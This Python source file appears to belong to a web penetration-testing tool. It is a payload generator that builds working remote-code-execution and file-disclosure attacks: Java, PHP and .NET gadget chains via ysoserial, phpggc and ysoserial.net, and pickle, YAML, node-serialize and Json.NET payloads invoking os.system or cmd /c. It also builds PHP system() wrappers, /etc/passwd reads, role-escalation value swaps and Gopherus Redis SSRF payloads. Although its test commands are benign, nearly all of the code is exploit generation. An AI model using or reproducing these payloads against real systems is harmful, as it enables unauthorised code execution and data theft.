import subprocess
import base64
import os
import re
import pickle
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tool_config import get_tool_path, get_oob_domain

class PayloadMutation:

    YSOSERIAL_PATH = get_tool_path("ysoserial")

    TEST_COMMANDS = ["id", "whoami", "hostname"]

    JAVA_CHAIN_MAP = {
        "CommonsCollections": [ 
            "CommonsCollections6",
            "CommonsCollections1",
            "CommonsCollections4",
        ],
        "TemplatesImpl": [
            "Jdk7u21",
            "CommonsCollections4",
        ],
        "Spring": [
            "Spring1",
            "Spring2",
        ],
        "Groovy": [
            "Groovy1",
        ],
        "JNDI": [
            "CommonsCollections6",
            "Spring1",
        ],
    }

    def __init__(self, exploit_result: dict, vector: dict) -> None:
        self.exploit = exploit_result
        self.vector  = vector
        self.probe   = exploit_result.get("suggested_probe", "")
        self.etype   = exploit_result.get("exploit_type", "")

    def mutate(self) -> list[dict]:
        if self.probe == "ysoserial":
            return self._mutate_java()
        if self.probe == "urldns_probe":
            return self._mutate_java_urldns()
        if self.probe in ("gadget_chain", "magic_method"):
            return self._php_mutation()
        if self.probe in ("flip_boolean", "modify_string","modify_integer"):
            return self.__mutated_php_choose()
        if self.probe == "pickle_exec":
            return self._mutate_pickle()
        if self.probe == "yaml_exec":
            return self._mutate_yaml()
        if self.probe in ("node_serialize", "proto_pollution"):
            return self._mutate_nodejs()
        if self.probe == "ruby_marshal":
            return self._mutate_ruby()
        if self.probe in ("viewstate", "dotnet_deser"):
            return self._mutate_dotnet_viewstate()
        if self.probe == "jsonnet":
            return self._mutate_dotnet_jsonnet()
        if self.probe in ("rce", "phar_deser", "ssrf", "php_input", "lfi", "code_inject", "traversal", "stream"):
            return self._mutate_wrapper()
        return []


    def _resolve_chains(self) -> list[str]:
        for key, chains in self.JAVA_CHAIN_MAP.items():
            if key.lower() in self.etype.lower():
                return chains
        return ["CommonsCollections6", "CommonsCollections1", "Spring1"]

    def _get_java_flags(self) -> list[str]:
        try:
            result = subprocess.run(
                ["java", "-version"],
                capture_output=True,
                text=True
            )
            output = result.stderr + result.stdout
            if '"1.' in output:
                return []   
            return [
                "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
                "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
                "--add-opens=java.base/java.net=ALL-UNNAMED",
                "--add-opens=java.base/java.util=ALL-UNNAMED",
                "--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED",
            ]
        except Exception:
            return []

    def _run_ysoserial(self, chain: str, command: str) -> str | None:
        if not os.path.exists(self.YSOSERIAL_PATH):
            return None
        try:
            flags = self._get_java_flags()
            cmd   = ["java"] + flags + ["-jar", self.YSOSERIAL_PATH, chain, command]

            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=15
            )

            if result.returncode == 0 and result.stdout:
                return base64.b64encode(result.stdout).decode()

            return None

        except subprocess.TimeoutExpired:
            print(f"[!] Timeout: {chain}")
            return None
        except FileNotFoundError:
            print("[!] java not found")
            return None

    def _make_payload(self, ptype, chain, command, b64) -> dict:
        
        url_safe = b64.replace('+', '%2B').replace('=', '%3D').replace('/', '%2F')

        return {
            "type":              ptype,
            "chain":             chain,
            "command":           command,
            "payload":           b64,          
            "payload_urlencoded": url_safe,   
            "location":          self.vector.get("location"),
            "name":              self.vector.get("name"),
            "url":               self.vector.get("url"),
            "method":            self.vector.get("method"),
            "encoding":          "base64",
        }

    def _mutate_java(self) -> list[dict]:
        results = []
        chains  = self._resolve_chains()

        if not os.path.exists(self.YSOSERIAL_PATH):
            return [{
                "error":   "ysoserial-all.jar not found",
                "hint":    f"Place ysoserial-all.jar at: {os.path.abspath(self.YSOSERIAL_PATH)}",
                "command": f"java -jar ysoserial-all.jar {chains[0]} 'id' > payload.ser"
            }]

        for chain in chains:
            for cmd in self.TEST_COMMANDS:
                print(f"[*] Trying {chain} → {cmd}")
                b64 = self._run_ysoserial(chain, cmd)
                if b64:
                    results.append(self._make_payload("java_deser", chain, cmd, b64))
                    print(f"[+] Generated: {chain}")
                else:
                    print(f"[-] Failed: {chain}")

        return results


    def _mutate_java_urldns(self) -> list[dict]:
        if not os.path.exists(self.YSOSERIAL_PATH):
            return [{
                "error": "ysoserial-all.jar not found",
                "hint":  "java -jar ysoserial-all.jar URLDNS 'http://YOUR_CANARY' | base64"
            }]

        oob_domain = get_oob_domain()
        if oob_domain:
            canary = f"http://{oob_domain}"
            note = f"Configured OOB domain — check {oob_domain}'s interaction log for a DNS/HTTP callback"
        else:
            canary = "http://canary.REPLACE_WITH_YOUR_INTERACTSH_DOMAIN.com"
            note = "No OOB domain configured — set 'oob_domain' in config.json (or ETHICALQUOC_OOB_DOMAIN) to your Interactsh/Burp Collaborator subdomain"

        b64 = self._run_ysoserial("URLDNS", canary)

        if b64:
            payload = self._make_payload("java_urldns", "URLDNS", canary, b64)
            payload["note"] = note
            return [payload]

        return []
    
    
    ##PHP
    
    PHPGGC_PATH = get_tool_path("phpggc")
    
    PHP_GADGET_CHAINS_MAP = {
    "monolog": [
        "Monolog/FW1",
        "Monolog/RCE1",
        "Monolog/RCE2",
        "Monolog/RCE3",
        "Monolog/RCE4",
        "Monolog/RCE5",
        "Monolog/RCE6",
        "Monolog/RCE7",
        "Monolog/RCE8",
        "Monolog/RCE9",
    ],
    "guzzle": [
        "Guzzle/FW1",
        "Guzzle/INFO1",
        "Guzzle/RCE1",
    ],
    "swiftmailer": [
        "SwiftMailer/FD1",
        "SwiftMailer/FD2",
        "SwiftMailer/FR1",
        "SwiftMailer/FW1",
        "SwiftMailer/FW2",
        "SwiftMailer/FW3",
        "SwiftMailer/FW4",
    ],
    "laravel": [
        "Laravel/FD1",
        "Laravel/RCE1",
        "Laravel/RCE2",
        "Laravel/RCE3",
        "Laravel/RCE4",
        "Laravel/RCE5",
        "Laravel/RCE6",
        "Laravel/RCE7",
        "Laravel/RCE8",
        "Laravel/RCE9",
        "Laravel/RCE10",
        "Laravel/RCE11",
        "Laravel/RCE12",
        "Laravel/RCE13",
        "Laravel/RCE14",
        "Laravel/RCE15",
        "Laravel/RCE16",
        "Laravel/RCE17",
        "Laravel/RCE18",
        "Laravel/RCE19",
        "Laravel/RCE20",
        "Laravel/RCE21",
        "Laravel/RCE22",
    ],
    "symfony": [
        "Symfony/FD1",
        "Symfony/FW1",
        "Symfony/FW2",
        "Symfony/RCE1",
        "Symfony/RCE2",
        "Symfony/RCE3",
        "Symfony/RCE4",
        "Symfony/RCE5",
        "Symfony/RCE6",
        "Symfony/RCE7",
        "Symfony/RCE8",
        "Symfony/RCE9",
        "Symfony/RCE10",
        "Symfony/RCE11",
        "Symfony/RCE12",
        "Symfony/RCE13",
        "Symfony/RCE14",
        "Symfony/RCE15",
        "Symfony/RCE16",
    ],
    "yii": [
        "Yii/RCE1",
        "Yii/RCE2",
        "Yii2/RCE1",
        "Yii2/RCE2",
    ],
    "zend": [
        "ZendFramework/FD1",
        "ZendFramework/RCE1",
        "ZendFramework/RCE2",
        "ZendFramework/RCE3",
        "ZendFramework/RCE4",
        "ZendFramework/RCE5",
    ],
    "codeigniter": [
        "CodeIgniter4/FD1",
        "CodeIgniter4/FD2",
        "CodeIgniter4/FR1",
        "CodeIgniter4/RCE1",
        "CodeIgniter4/RCE2",
        "CodeIgniter4/RCE3",
        "CodeIgniter4/RCE4",
        "CodeIgniter4/RCE5",
        "CodeIgniter4/RCE6",
    ],
    "slim": [
        "Slim/RCE1",
    ],
    "wordpress": [
        "WordPress/RCE1",
        "WordPress/RCE2",
        "WordPress/Dompdf/RCE1",
        "WordPress/Dompdf/RCE2",
        "WordPress/Guzzle/RCE1",
        "WordPress/Guzzle/RCE2",
        "WordPress/P/WooCommerce/RCE1",
        "WordPress/P/WooCommerce/RCE2",
        "WordPress/P/YoastSEO/FW1",
    ],
    "drupal": [
        "Drupal/AT1",
        "Drupal/FD1",
        "Drupal/RCE1",
        "Drupal/SQLI1",
        "Drupal/SSRF1",
        "Drupal/XXE1",
        "Drupal7/FD1",
        "Drupal7/RCE1",
        "Drupal7/SQLI1",
        "Drupal7/SSRF1",
        "Drupal9/RCE1",
    ],
    "joomla": [
        "Joomla/FW1",
    ],
    "doctrine": [
        "Doctrine/FW1",
        "Doctrine/FW2",
        "Doctrine/RCE1",
        "Doctrine/RCE2",
    ],
    "thinkphp": [
        "ThinkPHP/FW1",
        "ThinkPHP/FW2",
        "ThinkPHP/RCE1",
        "ThinkPHP/RCE2",
        "ThinkPHP/RCE3",
        "ThinkPHP/RCE4",
    ],
    "typo3": [
        "Typo3/FD1",
    ],
    "cakephp": [
        "CakePHP/RCE1",
        "CakePHP/RCE2",
    ],
    "magento": [
        "Magento/FW1",
        "Magento/SQLI1",
        "Magento2/FD1",
        "Magento2/FD2",
    ],
}
    PHP_TYPE = {
        "system",
        "exec",
        "passthru",
        "unlink"
    }
    
    
    def _get_php_version(self) -> str:
        try:
            result = subprocess.run(["php", "-version"], capture_output=True, text=True)
            output = result.stdout + result.stderr
            if "PHP 5." in output: return "5"
            if "PHP 7." in output: return "7"
            if "PHP 8." in output: return "8"
            return "unknown"
        except Exception:
            return "unknown"
        
    def _php_mutation(self) -> list[dict]:
        results = []
        
        chains = self.__resolve_php_chain()
        if not os.path.exists(self.PHPGGC_PATH):
            return [{
                "error": "phpggc not found",
                "hint":  f"Place phpggc at: {self.PHPGGC_PATH}"
            }] 
        for chain in chains:
            for ptype in self.PHP_TYPE:
                for cmd in self.TEST_COMMANDS:
                    result = self._run_phpggc(chain, ptype, cmd)
                    if result:
                        results.append(self._make_payload("php_object", chain, cmd, result))
                        print(f"[+] Generated: {chain}")
                        
        return results
    
    
    def _run_phpggc(self, chain: str,type:str, command: str) -> str | None:
        try:
            cmd   = ["php"]  + [self.PHPGGC_PATH, chain,type, command,"-b"]
            result = subprocess.run(cmd, capture_output=True, timeout=15)

            if result.returncode == 0 and result.stdout:
                return result.stdout.decode().strip() 
            return None 
        except subprocess.TimeoutExpired:
            print(f"[!] Timeout: {chain}")
            return None
        except FileNotFoundError:
            print("[!] php not found")
            return None
        
    def __resolve_php_chain(self) -> list[str]:
        for key, chain in self.PHP_GADGET_CHAINS_MAP.items():
            if key.lower() in self.etype.lower() and chain:
                return chain
        return ["Monolog/RCE1", "Laravel/RCE1", "Symfony/RCE1"]
    
    
    def __flip_boolean(self, payload: str) -> list[dict]:
        results = []
        if "b:0" in payload:
            mutated = payload.replace("b:0", "b:1")
            encode_mutatedd = base64.b64encode(mutated.encode()).decode()
            results.append(self._make_payload("flip_boolean", None, None,encode_mutatedd ))
            
        if "b:1" in payload:
            mutated1 = payload.replace("b:1", "b:0")
            encode_mutatedd1 = base64.b64encode(mutated1.encode()).decode()
            results.append(self._make_payload("flip_boolean", None, None,encode_mutatedd1 ))
            
        return results
    
    def __modify_string(self, payload: str) -> list[dict]:
        results = []
        test_values = ["administrator", "admin", "root", "superuser"]
        
        for m in re.finditer(r's:(\d+):"([^"]+)"', payload):
            declared_len = int(m.group(1))
            original_val = m.group(2)

            all_hints = [
                "username", "user", "email", "login", "name",
                "role", "admin", "level", "access", "privilege"
            ]
            if not any(hint in payload[max(0, m.start()-20):m.start()].lower()
                    for hint in all_hints):
                continue

            for new_val in test_values:
                if new_val == original_val:
                    continue
                new_len = len(new_val)
                new_str = f's:{new_len}:"{new_val}"'
                mutated = payload.replace(m.group(0), new_str, 1)
                encode_mutated = base64.b64encode(mutated.encode()).decode()
                results.append(self._make_payload("modify_string", None, None,encode_mutated))
            
        
        return results
    
    def _mutate_integer(self, payload: str) -> list[dict]:
        results    = []
        int_values = [1, 2, 99, 100, 9999]

        import re
        for m in re.finditer(r'i:(\d+);', payload):
            original_val = int(m.group(1))
            for new_val in int_values:
                if new_val == original_val:
                    continue
                mutated2 = payload.replace(m.group(0), f'i:{new_val};', 1)
                encode_mutated2 = base64.b64encode(mutated2.encode()).decode()
                results.append(self._make_payload("modify_integer", None, None,encode_mutated2))

        return results
        
        
        
    def __mutated_php_choose(self) -> list[dict]:
        results = []
        origin = self.vector.get("value", "")
        if self.probe == "flip_boolean":
            results += self.__flip_boolean(origin)
        if self.probe == "modify_integer":
            results += self._mutate_integer(origin)
        if self.probe == "modify_string":
            results += self.__modify_string(origin)

        return results

    ## Python Pickle

    PICKLE_TEST_COMMANDS = TEST_COMMANDS

    class _PickleRCE:
        def __init__(self, command):
            self.command = command

        def __reduce__(self):
            return (os.system, (self.command,))

    def _mutate_pickle(self) -> list[dict]:
        results = []
        for cmd in self.PICKLE_TEST_COMMANDS:
            try:
                raw = pickle.dumps(self._PickleRCE(cmd))
            except Exception:
                continue
            b64 = base64.b64encode(raw).decode()
            payload = self._make_payload("pickle_rce", "os.system via __reduce__", cmd, b64)
            payload["note"] = "Payload is a pickled object whose __reduce__ calls os.system(command)"
            results.append(payload)
        return results

    ## YAML

    YAML_TEST_COMMANDS = TEST_COMMANDS

    def _mutate_yaml(self) -> list[dict]:
        results = []
        for cmd in self.YAML_TEST_COMMANDS:
            raw = (
                "!!python/object/apply:os.system\n"
                f"args: ['{cmd}']"
            )
            b64 = base64.b64encode(raw.encode()).decode()
            payload = self._make_payload("yaml_rce", "python/object/apply:os.system", cmd, b64)
            payload["payload_raw"] = raw
            payload["note"] = "Requires target to use yaml.load()/yaml.unsafe_load() without SafeLoader"
            results.append(payload)
        return results

    ## NodeJS

    NODEJS_TEST_COMMANDS = TEST_COMMANDS

    def _mutate_nodejs(self) -> list[dict]:
        results = []

        if self.probe == "node_serialize":
            for cmd in self.NODEJS_TEST_COMMANDS:
                raw = (
                    '{"rce":"_$$ND_FUNC$$_function(){'
                    f"require('child_process').exec('{cmd}');"
                    '}()"}'
                )
                b64 = base64.b64encode(raw.encode()).decode()
                payload = self._make_payload("node_serialize_rce", "node-serialize IIFE", cmd, b64)
                payload["payload_raw"] = raw
                payload["note"] = "Requires target to call node-serialize's unserialize() on this JSON"
                results.append(payload)
            return results

        # proto_pollution
        raw = '{"__proto__": {"isAdmin": true, "polluted": true}}'
        b64 = base64.b64encode(raw.encode()).decode()
        payload = self._make_payload("prototype_pollution", "__proto__ injection", None, b64)
        payload["payload_raw"] = raw
        payload["note"] = "Merge/clone of this JSON into an object may pollute Object.prototype"
        results.append(payload)
        return results

    ## Ruby Marshal

    RUBY_TEST_COMMANDS = TEST_COMMANDS

    def _mutate_ruby(self) -> list[dict]:
        results = []
        for cmd in self.RUBY_TEST_COMMANDS:
            ruby_script = (
                "require 'base64'; "
                "puts Base64.strict_encode64(Marshal.dump("
                f"Object.new.tap {{ |o| o.instance_variable_set(:@cmd, {cmd!r}) }}"
                "))"
            )
            try:
                result = subprocess.run(
                    ["ruby", "-e", ruby_script],
                    capture_output=True, text=True, timeout=15,
                )
            except (subprocess.TimeoutExpired, FileNotFoundError):
                results.append({
                    "error": "ruby not found or timed out",
                    "hint": "Install Ruby and ensure 'ruby' is on PATH to generate Marshal payloads",
                    "command": f"ruby -e \"puts Base64.strict_encode64(Marshal.dump(...))\"",
                })
                continue

            if result.returncode != 0 or not result.stdout.strip():
                continue

            b64 = result.stdout.strip()
            payload = self._make_payload("ruby_marshal", "Marshal.dump helper", cmd, b64)
            payload["note"] = "Generic Marshal object — replace with a real gadget chain for the target Ruby framework"
            results.append(payload)

        return results

    ## .NET

    YSOSERIALNET_PATH = get_tool_path("ysoserial_net")

    DOTNET_TEST_COMMANDS = TEST_COMMANDS

    DOTNET_GADGETS = [
        "TypeConfuseDelegate",
        "ObjectDataProvider",
        "ActivitySurrogateSelector",
    ]

    DOTNET_FORMATTER_MAP = {
        "binaryformatter": "BinaryFormatter",
        "objectstateformatter": "ObjectStateFormatter",
        "losformatter": "LosFormatter",
        "netdatacontractserializer": "NetDataContractSerializer",
    }

    def _resolve_dotnet_formatter(self) -> str:
        for kw, formatter in self.DOTNET_FORMATTER_MAP.items():
            if kw in self.etype.lower():
                return formatter
        return "BinaryFormatter"

    def _run_ysoserialnet(self, formatter: str, gadget: str, command: str) -> str | None:
        try:
            cmd = [
                self.YSOSERIALNET_PATH,
                "-f", formatter,
                "-g", gadget,
                "-c", command,
                "-o", "base64",
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
            return None
        except subprocess.TimeoutExpired:
            print(f"[!] Timeout: {gadget}")
            return None
        except (FileNotFoundError, PermissionError, OSError) as e:
            print(f"[!] Could not run ysoserial.net: {e}")
            return None

    def _mutate_dotnet_viewstate(self) -> list[dict]:
        results = []
        formatter = self._resolve_dotnet_formatter()

        if not os.path.exists(self.YSOSERIALNET_PATH):
            return [{
                "error": "ysoserial.net not found",
                "hint": f"Place ysoserial.exe at: {self.YSOSERIALNET_PATH}",
                "command": f"ysoserial.exe -f {formatter} -g TypeConfuseDelegate -c 'id' -o base64",
            }]

        for gadget in self.DOTNET_GADGETS:
            for cmd in self.DOTNET_TEST_COMMANDS:
                b64 = self._run_ysoserialnet(formatter, gadget, cmd)
                if b64:
                    payload = self._make_payload("dotnet_deser", f"{formatter}/{gadget}", cmd, b64)
                    payload["note"] = "For ViewState, target must have MAC validation disabled or key must be known/leaked"
                    results.append(payload)

        return results

    def _mutate_dotnet_jsonnet(self) -> list[dict]:
        results = []
        for cmd in self.DOTNET_TEST_COMMANDS:
            raw = (
                '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, '
                'Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",'
                '"MethodName":"Start",'
                '"MethodParameters":{"$type":"System.Collections.ObjectModel.ObservableCollection`1'
                '[[System.String, mscorlib]], System.ObjectModel",'
                f'"$values":["cmd","/c {cmd}"]}},'
                '"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}'
            )
            b64 = base64.b64encode(raw.encode()).decode()
            payload = self._make_payload("jsonnet_typeconfusion", "ObjectDataProvider", cmd, b64)
            payload["payload_raw"] = raw
            payload["note"] = "Requires target to use TypeNameHandling.All/Objects/Auto with a weakly-typed property"
            results.append(payload)
        return results

    ## Wrapper

    GOPHERUS_PATH = get_tool_path("gopherus")

    WRAPPER_TEST_COMMANDS = TEST_COMMANDS

    def _mutate_wrapper(self) -> list[dict]:
        if self.probe == "rce":
            return self._mutate_wrapper_expect()
        if self.probe == "phar_deser":
            return self._mutate_wrapper_phar()
        if self.probe == "ssrf":
            return self._mutate_wrapper_ssrf()
        if self.probe == "php_input":
            return self._mutate_wrapper_php_input()
        if self.probe == "code_inject":
            return self._mutate_wrapper_data()
        if self.probe == "lfi":
            return self._mutate_wrapper_lfi()
        if self.probe == "traversal":
            return self._mutate_wrapper_traversal()
        if self.probe == "stream":
            return self._mutate_wrapper_stream()
        return []

    def _mutate_wrapper_expect(self) -> list[dict]:
        results = []
        for cmd in self.WRAPPER_TEST_COMMANDS:
            raw = f"expect://{cmd}"
            b64 = base64.b64encode(raw.encode()).decode()
            payload = self._make_payload("wrapper_expect", "expect://", cmd, b64)
            payload["payload_raw"] = raw
            payload["note"] = "Requires the 'expect' PHP extension to be enabled on the target"
            results.append(payload)
        return results

    def _mutate_wrapper_phar(self) -> list[dict]:
        results = []
        chains = self.__resolve_php_chain()

        if not os.path.exists(self.PHPGGC_PATH):
            return [{
                "error": "phpggc not found",
                "hint": f"Place phpggc at: {self.PHPGGC_PATH}",
                "command": f"php phpggc {chains[0]} system id -p phar -o payload.phar",
            }]

        for chain in list(chains)[:3]:
            for ptype in self.PHP_TYPE:
                for cmd in self.TEST_COMMANDS:
                    try:
                        proc = subprocess.run(
                            ["php", self.PHPGGC_PATH, chain, ptype, cmd, "-p", "phar", "-o", "-"],
                            capture_output=True, timeout=15,
                        )
                    except (subprocess.TimeoutExpired, FileNotFoundError):
                        continue

                    if proc.returncode != 0 or not proc.stdout:
                        continue

                    b64 = base64.b64encode(proc.stdout).decode()
                    payload = self._make_payload("wrapper_phar", chain, cmd, b64)
                    payload["note"] = (
                        "Upload this .phar to the target (e.g. via avatar/file upload), then trigger "
                        "deserialization by referencing phar://<uploaded_path>/test.txt in a "
                        "file-operation sink (file_exists, is_file, fopen, etc.)"
                    )
                    results.append(payload)

        return results

    _PYTHON2_CANDIDATES = ["python2", "py -2", r"C:\Python27\python.exe"]

    def _find_python2(self) -> list[str] | None:
        """Gopherus (Analyze/third_tool/gopherus) is Python 2-only source.
        Tries common ways a Python 2 interpreter might be installed/aliased
        and returns the first one that responds to --version, or None if
        none is available.
        """
        for candidate in self._PYTHON2_CANDIDATES:
            cmd = candidate.split()
            try:
                result = subprocess.run(cmd + ["--version"], capture_output=True, timeout=5)
                if result.returncode == 0:
                    return cmd
            except (FileNotFoundError, OSError):
                continue
        return None

    def _mutate_wrapper_ssrf(self) -> list[dict]:
        oob_domain = get_oob_domain()
        if oob_domain:
            raw = f"gopher://{oob_domain}:80/_GET%20/oob-ssrf-check%20HTTP/1.1"
            b64 = base64.b64encode(raw.encode()).decode()
            canary_payload = self._make_payload("wrapper_ssrf_oob_canary", "gopher/oob-canary", None, b64)
            canary_payload["payload_raw"] = raw
            canary_payload["note"] = f"Blind SSRF confirmation — check {oob_domain}'s interaction log for an inbound connection"
            canary_result = [canary_payload]
        else:
            canary_result = []

        python2 = self._find_python2()
        if os.path.exists(self.GOPHERUS_PATH) and python2:
            try:
                proc = subprocess.run(
                    python2 + [self.GOPHERUS_PATH, "--exploit", "redis"],
                    capture_output=True, text=True, timeout=15,
                )
                if proc.returncode == 0 and proc.stdout.strip():
                    raw = proc.stdout.strip()
                    b64 = base64.b64encode(raw.encode()).decode()
                    payload = self._make_payload("wrapper_ssrf_gopher", "gopherus/redis", None, b64)
                    payload["payload_raw"] = raw
                    payload["note"] = "Generated via Gopherus — review before use, may contain destructive Redis commands"
                    return canary_result + [payload]
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass

        host = self._extract_host()
        raw = f"gopher://{host}:6379/_INFO%0D%0A"
        b64 = base64.b64encode(raw.encode()).decode()
        payload = self._make_payload("wrapper_ssrf_gopher", "manual/redis-info-probe", None, b64)
        payload["payload_raw"] = raw
        payload["note"] = (
            "Benign Redis INFO probe (non-destructive) to confirm SSRF reaches an internal Redis instance. "
            "Gopherus not found — install for richer Redis/Memcached RCE payloads."
        )
        return canary_result + [payload]

    def _mutate_wrapper_php_input(self) -> list[dict]:
        results = []
        for cmd in self.WRAPPER_TEST_COMMANDS:
            raw = f"<?php system('{cmd}'); ?>"
            b64 = base64.b64encode(raw.encode()).decode()
            payload = self._make_payload("wrapper_php_input", "php://input", cmd, b64)
            payload["payload_raw"] = raw
            payload["note"] = (
                "Send this as the raw POST body while the vulnerable parameter/include points to php://input"
            )
            results.append(payload)
        return results

    def _mutate_wrapper_data(self) -> list[dict]:
        results = []
        for cmd in self.WRAPPER_TEST_COMMANDS:
            code = f"<?php system('{cmd}'); ?>"
            data_uri = f"data://text/plain;base64,{base64.b64encode(code.encode()).decode()}"
            b64 = base64.b64encode(data_uri.encode()).decode()
            payload = self._make_payload("wrapper_data", "data://", cmd, b64)
            payload["payload_raw"] = data_uri
            payload["note"] = "Requires the sink to include()/require() the wrapper output as PHP code"
            results.append(payload)
        return results

    def _mutate_wrapper_lfi(self) -> list[dict]:
        targets = [
            ("file:///etc/passwd", "Unix credential file"),
            ("file://C:\\Windows\\win.ini", "Windows config file"),
            ("php://filter/convert.base64-encode/resource=index.php", "Source code disclosure"),
        ]
        results = []
        for raw, desc in targets:
            b64 = base64.b64encode(raw.encode()).decode()
            payload = self._make_payload("wrapper_lfi", desc, None, b64)
            payload["payload_raw"] = raw
            results.append(payload)
        return results

    def _mutate_wrapper_traversal(self) -> list[dict]:
        raw = "glob:///etc/*"
        b64 = base64.b64encode(raw.encode()).decode()
        payload = self._make_payload("wrapper_traversal", "glob://", None, b64)
        payload["payload_raw"] = raw
        payload["note"] = "Lists directory contents via glob:// stream wrapper — adjust path per target OS"
        return [payload]

    def _mutate_wrapper_stream(self) -> list[dict]:
        raw = "compress.zlib://php://filter/convert.base64-encode/resource=index.php"
        b64 = base64.b64encode(raw.encode()).decode()
        payload = self._make_payload("wrapper_stream", "compress.zlib://", None, b64)
        payload["payload_raw"] = raw
        payload["note"] = "Chained stream wrapper demonstrating filter+compression stacking"
        return [payload]

    def _extract_host(self) -> str:
        url = self.vector.get("url") or ""
        match = re.search(r"://([^/:]+)", url)
        return match.group(1) if match else "TARGET_HOST"
